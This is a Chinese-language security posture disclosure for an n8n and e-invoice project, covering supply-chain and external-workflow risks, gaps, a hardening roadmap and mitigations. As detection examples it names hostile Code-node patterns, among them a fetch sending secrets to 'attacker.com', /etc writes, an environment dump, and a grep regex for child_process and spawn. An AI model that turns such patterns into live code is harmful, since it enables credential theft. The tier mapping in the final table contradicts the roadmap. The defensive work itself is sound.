# 外部依賴 / 外部 GitHub Repo / 外部 workflow JSON 的安全現況與補強路徑

> **本文目的**：對外誠實揭露本 Pack 對「**從外部進來的東西**」（npm 套件、GitHub repo 內容、別人寄來的 workflow JSON、curl 抓回來的 docs）的安全防護現況、gap、與分階段補強計畫（v0.36.0 → v0.38.0）。
>
> **起源**：2026-06-19 使用者直接問「我們對外部 GitHub 進來後有做 security check and enhancements 嗎? 有對惡意程式做處理嗎?」— 老實答：**有，但是 advisory 等級不是 gate 等級，且對 npm 套件本身的程式碼內容沒做行為層 review**。本文把 gap 攤開，並 ship 分階段補強計畫，讓外界（潛在 user / 稽核 / 法遵）能評估與追蹤。

---

## 1. 「外部進來」的四種情境

| # | 情境 | 例子 | 風險面 |
| --- | --- | --- | --- |
| 1 | npm 套件被 `npm install` 拉進來 | svc 用 `@paid-tw/einvoice*` 6 個套件 | 套件被 hijack / 作者夾私 / post-install script 惡意 / typosquat |
| 2 | curl / WebFetch 抓 GitHub repo 文件 | 我用 `curl raw.githubusercontent.com/.../README.md` 看 SDK 介面 | main 分支被竄改 / 鏡像被注入 / 我讀到的跟下次讀的不一樣 |
| 3 | n8n workflow JSON 從別處進來 | 別人寄你一個 .workflow.json 想 import | Code 節點裡藏惡意 `jsCode`（dump env / 反殼 / 寫敏感檔）/ HTTP 節點打到 attacker URL |
| 4 | docker image 拉外部 base image | n8n 官方 image、Hono 官方 base、Trivy scanner image | base image 內含 CVE / image hash 不固定 / supply chain 攻擊 |

---

## 2. 現況盤點（v0.35.0 為止）

### 2.1 ✅ 已有的防線

| 防線 | 內容 | 強度評估 |
| --- | --- | --- |
| `package-lock.json` | svc 有 lock file，鎖每個套件的具體 hash | 🟡 鎖 hash 但 `^0.3.0` caret 仍允許 minor 自動升 |
| `npm audit --audit-level=high` | `.github/workflows/security-gate.yml` 內含 | 🟡 **continue-on-error** — 找到 high 仍 PASS，**是 advisory 不是 gate** |
| Trivy filesystem scan | 只跑在 on-prem case Dockerfile，不掃 svc / einvoice / 其他 | 🟡 範圍不完整 |
| Pack `security-scan.mjs` | regex 掃 workflow JSON 內已知反模式（webhook 無 auth、hardcoded 密鑰） | ✅ 結構層有效，但**不分析 Code node `jsCode` 內容** |
| svc 層 `bodyLimit` / `bearerAuth` / `cors deny by default` | SEC-1 / SEC-4 / SEC-5 已加 | ✅ 完成（針對 inbound 流量；不針對 outbound 依賴） |
| §1.6 lexical schema-before-claim rule | 防 AI 自吹「驗證通過」without evidence | ✅ behavioral 治理 |

### 2.2 ❌ 沒有的 gap

| # | 缺漏 | 風險 | 嚴重度 |
| --- | --- | --- | --- |
| G1 | npm package **provenance / signing 驗證**（`npm install --audit-signatures`） | 套件 release pipeline 被入侵直接吃進 svc | 🔴 高 |
| G2 | npm 套件**程式碼內容人類 / AI review**（@paid-tw/einvoice* 6 個套件原始碼） | 套件作者夾私 / 後門 / data exfil 不被發現；svc in-process 跑，會直接拿到 EINVOICE_SVC_TOKEN + 5 家 vendor credential | 🔴 高 |
| G3 | **SBOM** 產出 + 簽章 + 跨版本 diff | 出事時不知道用了什麼 + 不可審計 | 🟡 中 |
| G4 | **socket.dev / snyk** 等行為層 SCA（不只看 CVE，看 post-install script / network call / process spawn / 可疑 import） | `npm install` 階段惡意 script 直接 RCE | 🔴 高 |
| G5 | caret `^x.y.z` → 寫死 exact `x.y.z` | 自動拉到惡意 minor（npm 史上多次：event-stream / ua-parser-js / coa） | 🟡 中 |
| G6 | `npm audit` 改成 fail gate（不是 continue-on-error） | high CVE 上 main 沒人擋 | 🟡 中 |
| G7 | **外部 workflow JSON ingestion** 流程 — enhanced scanner 抓 Code 節點惡意 `jsCode`（`child_process` / `fs.writeFileSync('/etc/...')` / `process.env` 全 dump / `fetch('https://attacker.com', { body: …secrets… })`） | 別人寄來的 workflow JSON 一 import 即 RCE | 🔴 高 |
| G8 | svc 跑在 **unprivileged container + readonly fs + drop capabilities + secret read-only mount** | 即便套件被入侵，blast radius 受限 | 🟡 中 |
| G9 | dependency update review process（Renovate / Dependabot + **強制人類核可**而非 automerge） | AI 直接寫 PR 改版本可能被 hijack | 🟡 中 |
| G10 | curl / WebFetch 抓 GitHub raw 時的 **commit hash 鎖定**（不是讀 `main` 分支） | 我讀到的 README 跟下次讀的可能不一樣，無痕被換 | 🟡 中 |
| G11 | n8n container + svc container 的 **base image hash pin + 定期 rebase** | base image 漏洞累積 / 拉到被入侵的 latest | 🟡 中 |

### 2.3 對「惡意程式」**有沒有處理**

**很有限**：

| 風險類型 | 我們有沒有處理 |
| --- | --- |
| workflow JSON 內 **結構性疏忽**（無 auth、hardcoded secret）| ✅ `security-scan.mjs` 有抓 |
| workflow JSON 內 **惡意 Code 節點 jsCode**（RCE / 反殼 / env dump） | ❌ **沒有** |
| npm 套件 **post-install script 反殼** | ❌ **沒有** |
| npm 套件 **runtime data exfil**（SDK 收到 credential 後 silent POST 到 attacker domain） | ❌ **沒有** |
| Container **escape** / **capability abuse**（svc 在 docker 內若被 RCE，能不能逃出來打整台 host） | ❌ **沒有硬化** |
| Base image **latest 被入侵** | ❌ **沒 pin hash** |

---

## 3. 補強路線圖（分 3 個 release 推完）

### 3.1 v0.36.0（Tier 1 — 本週內）

**核心：把 advisory 升級成 gate；scanner 從結構層延伸到行為層。**

| 項目 | 解決哪個 gap |
| --- | --- |
| `security-scan.mjs` 加 **Code node malicious-pattern detector** | G7 |
| `npm audit` continue-on-error → **fail gate** | G6 |
| svc package.json caret `^` → 寫死 exact version + lock 比對 | G5 |
| 加 `socket.dev` GitHub App 設定文件 + Pack 自動化整合範例 | G4 |
| 寫 [`docs/external-package-security-posture.md`](.) 本文（已 ship） | （透明化） |
| `SECURITY-REVIEW.md` 加 SEC-017 / SEC-018 / SEC-019 | （文件層） |
| `code2n8n-pipeline` SKILL 加 §1.8「外部依賴 ingestion 規則」 | （SKILL 治理層） |

### 3.2 v0.37.0（Tier 2）

**核心：blast radius 限縮；ingestion 流程化；SBOM。**

| 項目 | 解決哪個 gap |
| --- | --- |
| svc Dockerfile **non-root user + readonly fs + USER 65534 + --cap-drop=ALL** | G8 |
| **SBOM 產生**（`cyclonedx-npm` 或 `syft`）+ commit `dist/sbom.json` + release 綁 | G3 |
| **Trivy 掃 svc image**（不只 on-prem case） | G3 / G11 |
| **GitHub Renovate** 設「**需人類核可**才 merge」+ 加 reviewers 名單 | G9 |
| **外部 workflow JSON ingestion 流程** — 加 `scripts/ingest-external-workflow.mjs` 跑 enhanced scanner + 二級 review 標記 | G7 |
| n8n + svc container **base image hash pin**（不用 `latest`） | G11 |

### 3.3 v0.38.0（Tier 3 — 新 Skill 治理層）

**核心：把 review SOP 寫成可被 AI Coder 跨案例引用的 Skill。**

| 項目 | 解決哪個 gap |
| --- | --- |
| 新 Skill `skills/tigerai/external-dependency-security` | （治理層總集） |
| Skill §1：npm 套件 review SOP（程式碼 / install script / network call 行為審查） | G2 |
| Skill §2：`npm install --audit-signatures` 整合 + sigstore provenance 驗證 | G1 |
| Skill §3：外部 GitHub repo 抓資料時的 commit hash 鎖定 SOP | G10 |
| Skill §4：外部 workflow JSON ingestion review SOP（人類 + AI 雙審） | G7 |
| `code2n8n-pipeline` SKILL Stage 7 加 **強制過 SCA gate**（呼叫上述 Skill） | （流程整合） |

---

## 4. 對外宣稱的精確版本

依 [`code2n8n-pipeline` SKILL §1.6 lexical schema-before-claim rule](../skills/tigerai/code2n8n-pipeline/SKILL.md)，本文嚴格區分以下狀態：

| 對象 | 我們可以宣稱什麼 | 不能宣稱什麼 |
| --- | --- | --- |
| **本 Pack ship 的 workflow / svc 程式碼** | v0.27 → v0.35 一路有 SEC-001~016 + SEC-9 v3，依 §1.6 evidence schema 標 status | 不可宣稱「**整 stack** 都安全」 |
| **外部依賴 npm 套件** | v0.36.0 後可宣稱「Tier 1 防護到位」；v0.37.0 可宣稱「Tier 2 blast radius 限縮」；v0.38.0 可宣稱「Tier 3 SOP 治理」 | **目前（v0.35.0）只能說「結構層有掃，行為層沒做」** |
| **外部 GitHub repo 抓的資料** | 無 | 「我們驗過原始碼」（沒有） |
| **外部 workflow JSON ingestion** | v0.37.0 後可宣稱「過 enhanced scanner + 二級 review」 | 目前不能說「我們會擋惡意 workflow」 |

---

## 5. 對使用本 Pack 案例的工程主管 / 稽核

**今天（v0.35.0）你應該知道的事**：

1. 本 Pack 的 svc 用 `@paid-tw/einvoice*` 6 個 npm 套件 — 這些套件的**原始碼我們沒有逐行 review**，依賴 npm 生態的 trust。
2. `npm audit` 跑了但**沒擋**（continue-on-error）— high CVE 仍可上 main。
3. workflow JSON scanner 是**結構層 regex**，**不分析 Code 節點 jsCode 是否惡意**。
4. svc container **不是 unprivileged**、**不是 readonly fs**。
5. 我們**沒做**「別人寄來 workflow JSON 一鍵 import」的安全把關。

**短期 mitigations 你今天就可以做**（不等我們 v0.36.x）：
- 把 svc 跑在 **`--user 65534`** + `--read-only` + `--cap-drop=ALL` docker flag
- 把 svc credentials 用 **`--secret`** mount 而非 `-e` env
- 把 caret 改成 exact pin：手動把 `^0.3.0` 改成 `0.3.0`（同時把 package-lock.json 一起 commit）
- 用 [`socket.dev` GitHub App](https://socket.dev/) 連到你 fork 的本 Pack（免費版即提供 npm 套件行為層警示）
- 別 import 任何來路不明的 .workflow.json — 至少 grep 一次 `child_process|require\(['\"](fs|net|http|child_process|dgram)['\"]\)|\.exec\(|spawn\(|\.connect\(`

---

## 6. 追蹤狀態

| 風險 | SECURITY-REVIEW SEC-### | 預計補完版本 |
| --- | --- | --- |
| G1 / G2 / G4 / G6 / G7 — 高優先（Tier 1）| SEC-017 ~ SEC-019 | v0.36.0 |
| G3 / G8 / G9 / G11 — 中優先（Tier 2） | （v0.37.0 加 SEC-020 ~ SEC-023） | v0.37.0 |
| G5 / G10 — 治理層（Tier 3） | （v0.38.0 加 SEC-024 ~ SEC-025 + 新 Skill）| v0.38.0 |

詳見 [SECURITY-REVIEW.md SEC-017 起](../examples/einvoice-n8n/SECURITY-REVIEW.md)。
